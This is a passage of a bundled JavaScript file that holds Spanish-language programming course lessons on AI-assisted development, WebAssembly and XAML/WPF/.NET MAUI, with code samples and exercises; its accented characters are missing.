`,completed:!1},{id:"vibe-18-final-semisenior",title:"Proyecto Semi-Senior Vibecoding",level:"semi-senior",content:`# Proyecto Final Semi-Senior: "Arquitectura Hbrida Supervisada"

Es hora de construir un sistema "Full Stack" delegando la sintaxis pero controlando cada decisin arquitectnica.

## El Escenario
Debes construir un sistema de "Gestin de Tareas con Roles".
*   Admin: Puede ver, crear, editar y borrar cualquier tarea.
*   Editor: Puede ver y editar todas las tareas, pero no borrarlas.
*   User: Solo puede ver sus propias tareas.

## Requerimientos Tcnicos (IA Asistida)

### 1. El Diseo de Datos
Pide a la IA que genere el esquema de base de datos (SQL o NoSQL) y los roles de usuario. **Debes validar que los roles no sean redundantes.**

### 2. El Backend (Contexto Inyectado)
Pide a la IA que genere los controladores de la API. Debes inyectar el contexto de qu librera de Auth ests usando (ej. JWT). **Debes aadir manualmente un middleware de seguridad que la IA olvide.**

### 3. El Frontend (Modularizacin)
Genera los componentes de la UI por separado (Botones, Inputs, Listas). Luego unifcalos en una pgina principal. **Refactoriza el cdigo de la pgina principal para usar un Custom Hook de Fetching.**

### 4. Testing (Calidad)
Genera el test de integracin para el flujo de "Un usuario intenta borrar una tarea que no es suya y recibe un error 403".

## Defensa de la Arquitectura
Escribe un archivo \`DESIGN_DECISIONS.md\`:
1. Por qu elegiste ese patrn de arquitectura para los roles?
2. Qu vulnerabilidad de seguridad detectaste y corregiste en el cdigo generado por la IA?
3. Cmo lograste que la IA no repitiera cdigo en el Frontend?

---

Felicidades, Semi-Senior! Has demostrado que puedes escalar un proyecto usando la IA como una palanca tcnica en lugar de una muleta.
`,completed:!1}]},w1={id:"wasm",title:"WebAssembly (WASM)",description:"Descubre cmo llevar el rendimiento de tus aplicaciones web al lmite ejecutando cdigo de bajo nivel a velocidad nativa.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"wasm-01-intro-wasm",title:"Qu es WebAssembly (WASM)?",level:"junior",content:`# Leccin 01: Qu es WebAssembly (WASM)?

**WebAssembly** (WASM) es un formato de instrucciones binarias diseado para ser ejecutado en el navegador a una velocidad cercana a la nativa. No viene a reemplazar a JavaScript, sino a trabajar junto a l.

## 1. Por qu lo necesitamos?
JavaScript es genial, pero tiene lmites. Cuando intentas hacer tareas muy pesadas (edicin de video en vivo, juegos 3D complejos, simulaciones fsicas), JS puede volverse lento porque es un lenguaje interpretado y dinmico.

**WASM** permite que lenguajes de bajo nivel como C++, Rust o Go corran en la web con un rendimiento increble.

## 2. Caractersticas Clave
*   **Velocidad:** Se compila a un formato binario que el navegador entiende casi instantneamente.
*   **Seguridad:** Corre en el mismo "sandbox" seguro que JavaScript. No puede acceder a tus archivos personales sin permiso.
*   **Portabilidad:** El mismo archivo \`.wasm\` funciona en Chrome, Firefox, Safari y Edge.

## 3. El Flujo de Trabajo
1.  Escribes cdigo en un lenguaje como **Rust**.
2.  Lo compilas a un archivo \`.wasm\`.
3.  Lo cargas en tu sitio web usando **JavaScript**.

---

### Concepto Junior:
Imagina que JavaScript es un excelente conductor de ciudad, pero WebAssembly es un motor de Frmula 1. Usas JS para la lgica de la App y WASM para las partes que requieren fuerza bruta.
`,completed:!1},{id:"wasm-02-integracion-js",title:"Integracin Bsica con JavaScript",level:"junior",content:`# Leccin 02: Integracin Bsica con JavaScript

Para usar WebAssembly, no necesitas dejar de usar JavaScript. De hecho, JS es el que "enciende" y controla el mdulo WASM.

## 1. Cargar un mdulo
El navegador tiene una API llamada \`WebAssembly\`. La forma ms moderna de cargar un mdulo es:

\`\`\`javascript
const response = await fetch('modulo.wasm');
const bytes = await response.arrayBuffer();
const { instance } = await WebAssembly.instantiate(bytes);

// Ahora puedes usar las funciones exportadas del mdulo
console.log(instance.exports.sumar(5, 10));
\`\`\`

## 2. Paso de datos
WASM solo entiende nmeros (enteros y flotantes). 
*   Si quieres pasar un **String** o un **Objeto**, la cosa se pone difcil: debes escribir esos datos en la "Memoria Compartida" (Shared Memory) del mdulo.
*   Por suerte, existen herramientas que automatizan esto por ti.

## 3. Cundo usarlo (Casos simples)
*   Algoritmos de compresin de imgenes.
*   Clculos matemticos complejos que se repiten miles de veces.
*   Parsing de archivos muy grandes.

---

### Misin Junior:
Aprender que WASM es como un "invitado especial" en tu programa. JS prepara la fiesta (el DOM, la UI), y WASM hace el trabajo pesado en la cocina.

### Ejercicio 2:
Si WebAssembly solo entiende nmeros, cmo crees que enviamos un nombre de usuario ("Octavio") al mdulo? (Pista: Los caracteres se convierten a nmeros usando cdigos como ASCII o UTF-8).
`,completed:!1},{id:"wasm-03-casos-reales-tooling",title:"Casos Reales y Performance",level:"semi-senior",content:`# Leccin 03: Casos Reales y Performance

Como Semi-Senior, ya no te maravilla que WASM sume nmeros rpido. Ahora te interesa saber dnde se aplica en la industria y cmo medir su impacto.

## 1. Casos Reales que cambiaron la Web
*   **Figma:** Casi todo el motor de diseo de Figma est escrito en C++ y compilado a WASM. Por eso es tan fluido comparado con otras herramientas web.
*   **Google Earth:** Antes era un programa pesado que debas instalar. Ahora corre en el navegador gracias a que portaron su cdigo base a WASM.
*   **Photoshop Web:** Adobe logr llevar las herramientas profesionales de edicin a la web usando esta tecnologa.

## 2. El costo del puente (JS-WASM Bridge)
Llamar a una funcin de WASM desde JS tiene un costo pequeo.
*   Si llamas a WASM para algo trivial 1 milln de veces, podras terminar siendo ms lento que JS puro debido al costo de cruzar el "puente".
*   **Estrategia:** Pasa el trabajo pesado a WASM, deja que procese todo all adentro durante mucho tiempo, y devuelve el resultado final.

## 3. Tooling Profesional
Dependiendo del lenguaje que elijas, usars diferentes herramientas:
*   **Rust:** \`wasm-pack\` y \`wasm-bindgen\`. Es el lenguaje ms amigable para WASM hoy en da.
*   **C++:** \`Emscripten\`. Es el veterano, ideal para portar libreras viejas de escritorio.
*   **AssemblyScript:** Un lenguaje muy parecido a TypeScript que compila directamente a WASM.

---

### Lo que hace un Semi-Senior:
Analiza si un clculo realmente necesita WASM. No usa WASM "porque es nuevo", sino cuando el Profiler de Chrome le dice que JavaScript est sufriendo.
`,completed:!1},{id:"wasm-04-arquitectura-seguridad",title:"Arquitectura y Sistemas Hbridos",level:"senior",content:`# Leccin 04: Arquitectura y Sistemas Hbridos

En el nivel Senior, WebAssembly no es solo una funcin rpida; es una decisin de arquitectura que permite portar lgica de negocio entre el Servidor y el Cliente.

## 1. Wasmtime y WASI (WebAssembly System Interface)
WASM ya no es solo para el navegador. Con **WASI**, WASM puede correr en servidores, dispositivos IoT y nubes.
*   **Servicios Cloud (Edge Computing):** Plataformas como Cloudflare Workers usan WASM para ejecutar cdigo ultra rpido cerca del usuario.

## 2. Arquitectura de Memoria Compartida
Un Senior domina el \`Linear Memory\`. El mdulo WASM ve la memoria como un gran array de bytes.
*   **Punteros en JS:** Aprendes a manejar punteros de memoria para leer estructuras de datos complejas sin copiar los datos (Zero-copy), lo cual es vital para la performance extrema.

## 3. Seguridad Avanzada: El Aislamiento
A diferencia de los plugins de antes (Flash o Java Applets), WASM no tiene acceso al sistema operativo.
*   **Capabiliy-based security:** Un mdulo WASM solo puede hacer lo que el host (JavaScript o el Servidor) le permite explcitamente a travs de funciones importadas. Esto lo hace ideal para ejecutar cdigo de terceros de forma segura.

---

### Visin Senior:
"WASM permite que el mismo motor de fsica o de encriptacin corra en tu App de iPhone, en tu web de React y en tu microservicio de Node.js, garantizando que el comportamiento sea 100% idntico en todos lados".

### Desafo Senior:
Investiga el concepto de **Component Model**. Es el futuro de WASM que permitir que un mdulo escrito en Rust use una librera escrita en Go sin complicaciones, todo dentro del navegador.
`,completed:!1},{id:"wasm-05-practica-wasm",title:"Prctica y Evaluacin: Maestro de WebAssembly",level:"senior",content:`# Prctica y Evaluacin: Maestro de WebAssembly

Demuestra tu capacidad para integrar potencia de bajo nivel en aplicaciones modernas.

---

## 1. Ejercicio Junior: El Creador de Mdulos
**Escenario:** Tienes una funcin en C que calcula el factorial de un nmero. Ya la compilaste a \`math.wasm\`.
*Consigna:* Escribe el cdigo necesario en JavaScript para cargar el mdulo y ejecutar la funcin \`factorial(5)\`.

## 2. Ejercicio Semi-Senior: Analista de Performance
**Escenario:** Tienes que procesar los pxeles de una cmara en tiempo real para aplicar un filtro de blanco y negro. 
1. Por qu enviaras la imagen a WASM en lugar de procesarla en JavaScript?
2. Cmo evitaras el cuello de botella al pasar los datos? (Pista: Memoria compartida).

## 3. Evaluacin Senior: Diseo de Sistema
**Escenario:** Tu empresa tiene una librera de encriptacin bancaria escrita en C++ hace 10 aos. Necesitan que los usuarios puedan firmar documentos desde el navegador sin que la clave privada salga de la computadora del cliente.
1. Describe cmo usaras WASM para este caso.
2. Qu ventajas de seguridad ofrece WASM para este tipo de operaciones sensibles frente a JavaScript?

---

### Misin:
Un ingeniero de WebAssembly no solo hace cdigo rpido, sino que expande las fronteras de lo que es posible hacer dentro de una pestaa del navegador. 
`,completed:!1,isProject:!0}]},bD={id:"xaml",title:"XAML / WPF / MAUI",description:"Disea interfaces de escritorio y mviles modernas con el lenguaje declarativo de .NET.",completed:!1,track:"Especializacin Frontend .NET",lessons:[{id:"xaml-01-intro-xaml",title:"Qu es XAML? Introduccin y Fundamentos",level:"junior",content:`# Leccin 1: Qu es XAML? Introduccin y Fundamentos

XAML (Extensible Application Markup Language) es el lenguaje declarativo creado por Microsoft para disear interfaces de usuario en aplicaciones .NET (WPF, UWP, .NET MAUI, Avalonia).

## 1. Relacin XAML  C#
XAML es solo una forma de instanciar objetos.
\`\`\`xml
<Button Content="Hola" Width="100"/>
\`\`\`
Es exactamente lo mismo que escribir en C#:
\`\`\`csharp
var btn = new Button();
btn.Content = "Hola";
btn.Width = 100;
\`\`\`
La ventaja de XAML es la separacin visual de la lgica.

## 2. Estructura Bsica
Un archivo XAML siempre comienza con un elemento raz (Root Element) y define espacios de nombres (XML Namespaces).
\`\`\`xml
<Window x:Class="MiApp.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Mi App" Height="450" Width="800">
    <!-- Contenido Aqu -->
</Window>
\`\`\`

---

### Misin Junior:
Entiende que cada etiqueta \`<Etiqueta>\` es una Clase y cada atributo \`Propiedad="..."\` es una Propiedad de esa clase. No hay magia, es instanciacin de objetos puros.
`,completed:!1},{id:"xaml-02-layouts",title:"Layouts y Paneles de Diseo",level:"junior",content:`# Leccin 2: Layouts y Paneles de Diseo

XAML usa "Contenedores" (Panels) para organizar los elementos. No se usan coordenadas X/Y fijas (evita \`Canvas\`).

## 1. StackPanel (Vertical / Horizontal)
Apila los elementos uno tras otro. Ideal para mens simples o listas de controles.
\`\`\`xml
<StackPanel Orientation="Vertical">
    <Button Content="Primero"/>
    <Button Content="Segundo"/>
</StackPanel>
\`\`\`

## 2. Grid (El rey de los Layouts)
Divide el espacio en filas y columnas. Es el 90% de tus layouts.

### Columnas y Filas: Tamaos
*   **Absoluto (\`100\`):** Tamao fijo en pxeles.
*   **Automtico (\`Auto\`):** Se ajusta al tamao del contenido.
*   **Proporcional (\`*\` / \`2*\`):** Toma el espacio restante. \`2*\` toma el doble que \`*\`.

### Grid Avanzado
Puedes usar \`SharedSizeGroup\` para sincronizar tamaos entre diferentes Grids o usar definiciones anidadas.
\`\`\`xml
<Grid>
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="Auto" MinWidth="100"/>
        <ColumnDefinition Width="*"/>
        <ColumnDefinition Width="2*"/>
    </Grid.ColumnDefinitions>
    
    <TextBlock Grid.Column="0" Text="Etiqueta fija"/>
    <Button Grid.Column="1" Content="Espacio 1/3"/>
    <Button Grid.Column="2" Content="Espacio 2/3"/>
</Grid>
\`\`\`

## 3. Responsive Bsico
En XAML, el "responsiveness" se logra mediante:
*   **Viewbox:** Escala todo su contenido para que quepa en el espacio disponible.
*   **UniformGrid:** Distribuye elementos en una cuadrcula donde todas las celdas tienen el mismo tamao.
*   **AdaptiveTrigger (MAUI/UWP):** Cambia el layout segn el ancho de la ventana.

## 4. Buenas Prcticas de Diseo
*   **Evita mrgenes fijos grandes:** Usa \`Padding\` y \`Margin\` para separaciones pequeas, pero deja que el \`Grid\` maneje el posicionamiento general.
*   **Min/Max Height/Width:** Siempre define lmites para evitar que la UI se rompa en pantallas muy pequeas o gigantes.
*   **No anides demasiados Paneles:** Muchos niveles de anidamiento degradan el rendimiento del renderizado.

---

### Misin Junior:
Usa \`Grid\` siempre que quieras controlar el espacio exacto. Usa \`StackPanel\` para listas simples. Nunca uses \`Canvas\` a menos que ests dibujando grficos vectoriales.
`,completed:!1},{id:"xaml-03-controles-basicos",title:"Controles Bsicos de Interfaz",level:"junior",content:`# Leccin 3: Controles Bsicos de Interfaz

Los controles son los "Ladrillos" de tu aplicacin XAML.

## 1. Entrada de Texto (Input)
*   **TextBox:** Entrada de una lnea. \`Text="{Binding ...}"\`.
*   **PasswordBox:** Entrada oculta (Ojo con la seguridad y MVVM).
*   **Label vs TextBlock:**
    *   \`TextBlock\`: Texto ligero de solo lectura (como un \`<span>\`).
    *   \`Label\`: Texto de etiqueta para formularios (como \`<label>\`). Soporta "Mnemnicos" (\`_Usuario\` hace Alt+U).

## 2. Botones y Accin
*   **Button:** El estndar. Tiene un evento \`Click\`.
*   **RepeatButton:** Dispara eventos continuos mientras se presiona.
*   **ToggleButton (CheckBox / RadioButton):** Tienen estado (Checked/Unchecked).

## 3. Listas (ItemsControl)
*   **ListBox:** Seleccin simple.
*   **ComboBox:** Dropdown select.
*   **ListView:** Tablas complejas con columnas.

---

### Misin Junior:
Nunca uses el evento \`Click\` en el Code-Behind (archivo .cs) si ests usando MVVM. Usa \`Command="{Binding MyCommand}"\`. Es el primer paso hacia una arquitectura limpia.
`,completed:!1},{id:"xaml-05-data-binding",title:"Data Binding y Patrn MVVM",level:"junior",content:`# Leccin 5: Data Binding y Patrn MVVM

El **Data Binding** es la caracterstica ms potente de XAML. Permite conectar la Interfaz de Usuario (View) con tus datos (ViewModel) de forma automtica.

## 1. Qu es Data Binding?
Es un puente entre una propiedad de la UI (ej. el \`Text\` de un Label) y una propiedad de un objeto C# (ej. el \`Nombre\` de un Usuario). Cuando los datos cambian, la UI se actualiza sola.

## 2. Binding Bsico (One-Way)
El flujo de datos va desde la fuente (C#) hacia el objetivo (XAML).
\`\`\`xml
<!-- En el XAML -->
<TextBlock Text="{Binding NombreUsuario}" />
\`\`\`

## 3. Two-Way Binding
Ideal para formularios. Si el usuario escribe en la UI, el objeto en C# se actualiza, y viceversa.
\`\`\`xml
<TextBox Text="{Binding Email, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}" />
\`\`\`
*   \`UpdateSourceTrigger=PropertyChanged\`: Actualiza el dato cada vez que presionas una tecla.

## 4. Introduccin a MVVM
MVVM (Model-View-ViewModel) es el patrn arquitectnico estndar en .NET.
*   **Model:** Tus datos puros (clases).
*   **View:** Tu archivo XAML (la cara de la app).
*   **ViewModel:** El intermediario. Contiene la lgica de la UI, comandos y propiedades bindeables.

### El Secreto: INotifyPropertyChanged
Para que la UI sepa que un dato cambi, el ViewModel debe implementar esta interfaz o usar herramientas como el **Community Toolkit MVVM**.

---

### Misin Junior:
El Data Binding elimina la necesidad de ponerle nombre (\`x:Name\`) a cada control y acceder a ellos desde el cdigo. Si ests escribiendo \`txtNombre.Text = "Hola"\`, probablemente lo ests haciendo mal. Usa Binding!
`,completed:!1},{id:"xaml-04-practica-junior",title:"Interfaz Junior en XAML",level:"junior",content:`# Prctica: Interfaz Junior en XAML

El diseo de UIs en XAML es como armar un rompecabezas.

---

## Reto 1: Login Simple
**Consigna:** Disea una pantalla de Login con:
1.  **Grid:** 2 filas (Login, Error) y 1 columna.
2.  **StackPanel Vertical:** Dentro de la fila 0.
    *   **Label:** "Usuario".
    *   **TextBox:** Con placeholder "Ingresa tu email".
    *   **Label:** "Contrasea".
    *   **PasswordBox.**
    *   **Button:** "Iniciar Sesin".
3.  **TextBlock:** En la fila 1, texto rojo, oculto por defecto (\`Visibility="Collapsed"\`).

## Reto 2: Layout Complejo
**Consigna:** Crea una "Calculadora" visual (solo UI, sin lgica).
1.  **Grid:** 5 filas (Display, y 4 filas de botones), 4 columnas.
2.  **Display:** Debe ocupar toda la primer fila (\`Grid.ColumnSpan="4"\`).
3.  Usa **Styles** (Estilos locales) para que todos los botones tengan margen \`5\` y fuente \`Arial\`.

## Reto 3: Lista de Compras
**Consigna:**
*   **Grid:** 2 columnas (Izquierda: Formulario, Derecha: Lista) separadas por un \`GridSplitter\` (opcional, si te animas).
*   **Izquierda:** TextBox + Button "Agregar".
*   **Derecha:** ListView que muestre Strings.

---

### Solucin Sugerida (Parte 1):
\`\`\`xml
<Grid Margin="20">
    <StackPanel VerticalAlignment="Center" Width="300">
        <TextBlock Text="Bienvenido" FontSize="24" HorizontalAlignment="Center" Margin="0,0,0,20"/>
        
        <Label Content="Usuario:"/>
        <TextBox x:Name="txtUser" Padding="5"/>
        
        <Label Content="Password:" Margin="0,10,0,0"/>
        <PasswordBox x:Name="txtPass" Padding="5"/>
        
        <Button Content="Entrar" Margin="0,20,0,0" Padding="10"/>
    </StackPanel>
</Grid>
\`\`\`
`,completed:!1,isProject:!0},{id:"xaml-06-mvvm-avanzado",title:"MVVM Avanzado, Commands y Converters",level:"semi-senior",content:`# Leccin 6: MVVM Avanzado, Commands y Converters

En el nivel Semi-Senior, dejamos de ver MVVM como una "sugerencia" y lo adoptamos como la arquitectura base.

## 1. El Patrn MVVM Profundo
No basta con bincdear texto. Un verdadero ViewModel maneja el **estado de la aplicacin**.
*   **Separacin de Responsabilidades:** La View no debe conocer la existencia de la base de datos o servicios.
*   **ObservableCollection:** La clase reina para bindeo de colecciones que notifican cambios a la UI.

## 2. Los Commands (ICommand)
En lugar de usar eventos como \`Click=""\`, usamos \`Command=""\`. Esto permite:
*   **Desacoplamiento:** El botn no sabe qu lgica ejecuta, solo dispara un comando.
*   **Lgica de Ejecucin (\`CanExecute\`):** El botn se deshabilita automticamente si las condiciones no se cumplen.
\`\`\`xml
<Button Content="Guardar" Command="{Binding SaveCommand}" />
\`\`\`

## 3. IValueConverter
A veces el tipo de dato en C# no coincide con lo que la UI necesita (ej: un \`bool\` que debe mostrar/ocultar un panel).
\`\`\`csharp
public class BoolToVisibilityConverter : IValueConverter {
    public object Convert(object value, ...) {
        return (bool)value ? Visibility.Visible : Visibility.Collapsed;
    }
}
\`\`\`
Se declara en Recursos y se usa as:
\`\`\`xml
<Grid Visibility="{Binding EsVisible, Converter={StaticResource MyBoolConverter}}" />
\`\`\`

---

### Misin Semi-Senior:
Aprende a usar el **CommunityToolkit.Mvvm**. El uso de \`[ObservableProperty]\` y \`[RelayCommand]\` reduce drsticamente el cdigo repetitivo (Boilerplate) y es el estndar moderno en la industria.
`,completed:!1},{id:"xaml-07-styles-resources",title:"Recursos, Estilos y Templates",level:"semi-senior",content:`# Leccin 7: Recursos, Estilos y Templates

Para crear interfaces premium y mantenibles, debemos centralizar la apariencia.

## 1. Resources (Static vs Dynamic)
Los recursos permiten definir objetos una vez y usarlos en toda la app.
*   **StaticResource:** Se evala al cargar la pgina (mejor rendimiento).
*   **DynamicResource:** Permite cambiar el valor en tiempo de ejecucin (til para Temas/Dark Mode).

## 2. Styles y Setters
Evita repetir propiedades. Define estilos globales o locales.
\`\`\`xml
<Style TargetType="Button" x:Key="PrimaryButtonStyle">
    <Setter Property="Background" Value="#2563eb"/>
    <Setter Property="Foreground" Value="White"/>
    <Setter Property="Padding" Value="10,5"/>
</Style>
\`\`\`

## 3. DataTemplates
Define **cmo se ve un objeto**. Es fundamental para listas complejas.
*   Si tienes una lista de \`Usuarios\`, el DataTemplate define que cada usuario se vea como una tarjeta con su foto y nombre.

## 4. ControlTemplates (Redefiniendo la UI)
Es el nivel ms avanzado de personalizacin. Permite cambiar la **estructura visual** de un control sin cambiar su comportamiento.
*   Puedes hacer que un \`Button\` sea un crculo perfecto con una animacin de pulso, pero que siga teniendo su evento \`Click\` y \`Command\`.

---

### Misin Semi-Senior:
Diferencia claramente entre un **DataTemplate** (datos) y un **ControlTemplate** (estructura del control). Si quieres cambiar cmo se ve un tem en una lista, usa DataTemplate. Si quieres que el botn tenga sombras y bordes redondeados personalizados, usa ControlTemplate.
`,completed:!1},{id:"xaml-08-practica-semi-senior",title:"Prctica: Proyecto MVVM Moderno",level:"semi-senior",content:`# Prctica: Proyecto MVVM Moderno

Implementemos una aplicacin CRUD (Create, Read, Update, Delete) usando MVVM puro y Estilos.

---

## Reto 1: Definir el Modelo y ViewModel
**Consigna:** Crea una clase \`Producto\` (Nombre, Precio) y un \`ProductoViewModel\` (lista ObservableCollection, comandos Agregar y Eliminar).
1.  Usa \`INotifyPropertyChanged\` o un framework (Community Toolkit) para manejar las actualizaciones de propiedades.

## Reto 2: Crear la Interfaz (View)
**Consigna:**
*   **Encabezado:** Un estilo global para ttulos (\`FontSize=20\`, \`Negrita\`).
*   **Lista:** Un \`ListView\` bindeado a \`Productos\`. Usa un \`ItemTemplate\` personalizado para mostrar el producto como una tarjeta.
*   **Formulario:** 2 TextBox y un botn vinculados a las propiedades de edicin en el VM.
*   **Estilos:** Los TextBox deben tener un borde sutil y margen.

## Reto 3: IValueConverter (Bonus)
**Consigna:** Crea un \`BoolToVisibilityConverter\`.
*   Si la lista est vaca, muestra un TextBlock "No hay productos" (\`Visibility=Visible\`). Si no, \`Collapsed\`.

---

### Solucin Sugerida (Parte 1):
\`\`\`csharp
public partial class MainViewModel : ObservableObject {
    [ObservableProperty]
    private string nombre;

    [ObservableProperty]
    private ObservableCollection<Producto> productos = new();

    [RelayCommand]
    private void Agregar() {
        if (!string.IsNullOrEmpty(Nombre))
            Productos.Add(new Producto { Nombre = Nombre });
    }
}
\`\`\`
`,completed:!1,isProject:!0},{id:"xaml-09-integracion",title:"Integracin XAML + C#",level:"junior",content:`# Leccin 9: Integracin XAML + C#

La verdadera potencia de XAML reside en cmo se comunica con el cdigo C#.

## 1. El Code-behind (.xaml.cs)
Cada archivo de vista (\`Page.xaml\`) tiene un archivo compaero (\`Page.xaml.cs\`).
*   **x:Class:** Define la clase parcial en XAML que se une con la de C#.
*   **InitializeComponent():** El mtodo que "infla" el XAML y crea los objetos en memoria.

## 2. El ViewModel (El cerebro)
La forma correcta de integrar la lgica no es en el Code-behind, sino mediante un **ViewModel**.
*   **DataContext:** Es la propiedad de la Vista que le dice: "Tus datos estn en este objeto".
\`\`\`csharp
public MainWindow() {
    InitializeComponent();
    this.DataContext = new MainViewModel();
}
\`\`\`

## 3. Comunicacin Vista <-> Lgica
*   **De Vista a Lgica:** Mediante **Commands**. El usuario hace click -> El comando se ejecuta en el VM.
*   **De Lgica a Vista:** Mediante **INotifyPropertyChanged**. El VM cambia un dato -> La UI se refresca sola.
*   **Eventos:** Solo para lgica puramente visual (animaciones, foco) que no pertenece a la lgica de negocio.

---

### Misin Junior:
Mantn el Code-behind lo ms vaco posible. Si puedes resolverlo con Binding o un Command, no escribas cdigo en el \`.xaml.cs\`. Tu objetivo es tener una "Vista Tonta" y un "ViewModel Inteligente".
`,completed:!1},{id:"xaml-10-maui",title:"XAML en .NET MAUI",level:"semi-senior",content:`# Leccin 10: XAML en .NET MAUI

.NET MAUI es la evolucin multiplataforma de Xamarin.Forms, permitiendo crear apps para Android, iOS, Windows y macOS con un solo cdigo.

## 1. Estructura de Proyecto MAUI
*   **Platforms/:** Cdigo especfico para cada SO (sensores, permisos).
*   **Resources/:** Imgenes, fuentes y estilos globales (\`App.xaml\` y \`AppShell.xaml\`).
*   **MauiProgram.cs:** El punto de entrada donde se configuran servicios y fuentes.

## 2. UI Multiplataforma
XAML en MAUI introduce etiquetas especficas para el manejo de diferentes pantallas:
*   **OnPlatform:** Aplica valores segn el sistema operativo.
*   **OnIdiom:** Ajusta la UI si es Telfono, Tablet o Desktop.
\`\`\`xml
<Button Text="Click" WidthRequest="{OnPlatform WinUI=200, Android=100}" />
\`\`\`

## 3. Navegacin con AppShell
Shell simplifica la navegacin mediante rutas tipo URL.
*   **Tabbar / Flyout:** Mens de pestaas o laterales definidos en XAML.
*   **Navegacin Programtica:** \`Shell.Current.GoToAsync("//LoginPage")\`.

## 4. Buenas Prcticas
*   **Compiled Bindings (x:DataType):** Aumenta el rendimiento y permite validacin en tiempo de compilacin.
*   **Layout Optimization:** Evita el uso excesivo de \`StackLayout\` anidados; prefiere \`Grid\` para layouts complejos para mejorar el renderizado.
*   **Handlers:** Si necesitas acceso nativo, usa el patrn de Handlers/Mappers en lugar de Custom Renderers.

---

### Misin Semi-Senior:
Domina el uso de **AppShell**. Es la columna vertebral de cualquier aplicacin mvil moderna en MAUI y te permite gestionar rutas, parmetros y apariencia global desde un solo archivo XAML.
`,completed:!1},{id:"xaml-11-arquitectura-pro",title:"Arquitectura Profesional y Modularizacin",level:"senior",content:`# Leccin 11: Arquitectura Profesional y Modularizacin

En el nivel Senior, XAML no es solo diseo, es la base de un sistema escalable y mantenible a largo plazo.

## 1. Arquitectura MVVM Profesional
Ms all de bindeos bsicos, una arquitectura empresarial utiliza:
*   **Inyeccin de Dependencias (DI):** Registro de ViewModels y Servicios en el contenedor de dependencias (\`IServiceCollection\`).
*   **Messenger / EventAggregator:** Comunicacin desacoplada entre diferentes componentes de la app mediante mensajes (Pub/Sub).
*   **Validacin Avanzada:** Uso de \`INotifyDataErrorInfo\` para validaciones asncronas y de servidor.

## 2. Modularizacin y Reutilizacin
*   **UserControls vs CustomControls:**
    *   \`UserControl\`: Composicin de controles existentes (fcil y rpido).
    *   \`CustomControl\`: Hereda de \`Control\`, usa un \`Generic.xaml\` y permite una personalizacin profunda mediante \`DefaultStyleKey\`.
*   **ResourceDictionaries Externos:** Organizacin de estilos, colores y plantillas en libreras de clases separadas para compartir entre proyectos.

## 3. Manejo de Estado Complejo
*   **State Containers:** Gestin de estados de carga (Loading), error y datos vacos de forma declarativa en XAML.
*   **Navigation Abstracta:** El ViewModel nunca conoce la View; la navegacin se resuelve mediante una interfaz \`INavigationService\`.

---

### Misin Senior:
Implementa siempre **Inyeccin de Dependencias**. Un ViewModel senior recibe sus servicios por constructor, permitiendo que la aplicacin sea 100% testeable mediante Unit Testing.
`,completed:!1},{id:"xaml-12-performance",title:"Performance en UI y Animaciones",level:"senior",content:`# Leccin 12: Performance en UI y Animaciones

Una aplicacin senior debe sentirse fluida (60 FPS) y visualmente atractiva sin comprometer recursos.

## 1. Optimizacin del Rendimiento
*   **Virtualizacin de UI:** Uso de \`VirtualizingStackPanel\` para manejar miles de elementos en listas sin degradar la memoria.
*   **Binding Improvements:** 
    *   Uso de \`Mode=OneTime\` para datos estticos.
    *   \`x:Bind\` (UWP/WinUI/MAUI) para bindeos en tiempo de compilacin.
*   **Layout Profiling:** Reduccin de la profundidad del rbol visual (Visual Tree). Cada nivel de anidamiento aade un costo de clculo de medida y posicin.

## 2. Animaciones Avanzadas
XAML permite animaciones potentes basadas en Storyboards y Visual States.
*   **Storyboards:** Control preciso sobre el tiempo, interpolacin (Easing Functions) y propiedades.
*   **VisualStateManager (VSM):** Define cmo cambian los controles segn su estado (MouseOver, Focused, Error, Mobile vs Desktop).
\`\`\`xml
<VisualState Name="PointerOver">
    <Storyboard>
        <ColorAnimation Storyboard.TargetProperty="Background.Color" To="Red" Duration="0:0:0.2"/>
    </Storyboard>
</VisualState>
\`\`\`

## 3. Composicin y Efectos
*   **Shaders y Brushes:** Uso de \`LinearGradientBrush\`, \`ImageBrush\` y efectos de Blur o DropShadow sin sobrecargar el hilo de UI.
*   **Lottie & Rive:** Integracin de animaciones vectoriales complejas externas para una experiencia premium.

---

### Misin Senior:
Nunca uses el hilo principal para tareas pesadas. Aprende a usar el **Visual Tree Helper** para debuggear problemas de rendimiento y asegrate de que tus animaciones sean "Non-blocking" para la interaccin del usuario.
`,completed:!1},{id:"xaml-13-practica-senior",title:"Prctica: Dashboard Empresarial Escalable",level:"senior",content:`# Prctica Senior: Dashboard Empresarial Escalable

El desafo final consiste en disear el ncleo de una aplicacin de nivel empresarial que sea modular, rpida y estticamente superior.

---

## Reto 1: Estructura Modular (Arquitectura)
**Consigna:** Disea el esqueleto de una aplicacin con DI y Messenger.
1.  Configura un **ServiceLocator** o usa \`Microsoft.Extensions.DependencyInjection\`.
2.  Crea un sistema de navegacin donde los ViewModels soliciten cambiar de pantalla sin conocer las clases de la Vista.
3.  Implementa un \`NotificationService\` que pueda disparar avisos (Toasts) desde cualquier ViewModel mediante mensajes desacoplados.

## Reto 2: UI Dinmica y Performance
**Consigna:** Crea un "Explorador de Datos" de alto rendimiento.
1.  Usa un \`ListView\` con **Virtualizacin activada**.
2.  Crea un \`DataTemplateSelector\` para mostrar diferentes tipos de filas segn el tipo de dato.
3.  Asegura que el scroll se mantenga a 60 FPS incluso con 10,000 registros ficticios.

## Reto 3: Experiencia de Usuario (VSM)
**Consigna:**
*   Implementa un **VisualStateManager** avanzado para el men lateral.
*   Al colapsar el men, los iconos deben animarse suavemente y las etiquetas deben desaparecer con un efecto de \`FadeOut\`.
*   Aade un "Skeleton Loader" animado mientras se simula la carga de datos.

---

### Solucin Sugerida (Concepto DI):
\`\`\`csharp
// MauiProgram.cs o App.xaml.cs
public static class MauiProgram {
    public static MauiApp CreateMauiApp() {
        var builder = MauiApp.CreateBuilder();
        
        // Registro de Servicios
        builder.Services.AddSingleton<IDataService, AzureDataService>();
        builder.Services.AddSingleton<INavigationService, ShellNavigationService>();
        
        // Registro de ViewModels
        builder.Services.AddTransient<MainViewModel>();
        builder.Services.AddTransient<DetailsViewModel>();

        return builder.Build();
    }
}
\`\`\`
